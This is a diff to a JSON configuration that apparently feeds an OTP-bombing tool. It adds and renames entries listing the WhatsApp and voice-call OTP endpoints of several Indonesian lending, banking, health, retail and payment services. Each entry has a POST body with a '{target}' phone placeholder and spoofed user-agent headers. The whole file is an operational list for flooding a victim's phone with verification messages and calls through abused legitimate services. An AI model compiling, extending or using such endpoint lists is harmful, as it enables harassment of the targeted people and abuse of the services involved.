@@ -1,25 +1,41 @@
 {
   "whatsapp": [
     {
-      "name": "MATAHARI-WA",
+      "name": "KREDIT-PINTAR",
+      "url": "https://api.kreditpintar.com/v1/auth/otp",
+      "method": "POST",
+      "data": {"phone": "{target}", "category": "SIGN_IN"},
+      "headers": {"Content-Type": "application/json", "User-Agent": "okhttp/4.9.1"}
+    },
+    {
+      "name": "MATAHARI-NEW",
       "url": "https://api.matahari.com/v1/auth/otp",
       "method": "POST",
       "data": {"phone": "{target}", "type": "register"},
-      "headers": {
-        "User-Agent": "Mozilla/5.0",
-        "Content-Type": "application/json"
-      }
+      "headers": {"User-Agent": "Mozilla/5.0"}
+    },
+    {
+      "name": "ALADIN-OTP",
+      "url": "https://api.aladinbank.id/v1/otp",
+      "method": "POST",
+      "data": {"phone_number": "{target}"},
+      "headers": {"Content-Type": "application/json"}
     }
   ],
   "call": [
     {
-      "name": "MAP-CALL",
-      "url": "https://mapclub.com/api/v1/signup/otp",
+      "name": "KLIKDOKTER-CALL",
+      "url": "https://api.klikdokter.com/v1/auth/otp",
+      "method": "POST",
+      "data": {"phone": "{target}", "type": "call"},
+      "headers": {"User-Agent": "Mozilla/5.0"}
+    },
+    {
+      "name": "ASTRA-PAY",
+      "url": "https://api.astrapay.com/v1/otp",
       "method": "POST",
       "data": {"phone": "{target}"},
-      "headers": {
-        "User-Agent": "okhttp/4.9.0"
-      }
+      "headers": {"User-Agent": "okhttp/3.12.1"}
     }
   ]
 }
